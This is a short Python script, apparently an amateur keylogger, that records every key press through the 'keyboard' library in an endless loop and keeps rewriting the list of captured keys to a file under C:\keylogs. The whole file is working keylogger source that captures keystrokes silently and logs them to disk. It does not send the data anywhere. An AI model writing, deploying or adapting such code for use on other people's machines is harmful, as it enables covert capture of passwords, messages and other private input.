import os
import keyboard
keys = []

folder_path = r'C:\\keylogs'
file_path = r'C:\\keylogs\\keylog.txt'

if not os.path.exists(folder_path):
    os.makedirs(folder_path)
    
    while True:
        event = keyboard.read_event()
        if event.event_type == keyboard.KEY_DOWN:
            # keys += event.name
            keys.append(event.name)
            
            with open(file_path, "w") as f:
                f.write(f"keys: {keys}")
                
                
                # break
                
else:
    while True:
        event = keyboard.read_event()
        if event.event_type == keyboard.KEY_DOWN:
            # keys.append(event.name) #used for append in lists
            keys.append(event.name)
            
            with open(file_path, "w") as f:
                f.write(f"keys: {keys}")
                

                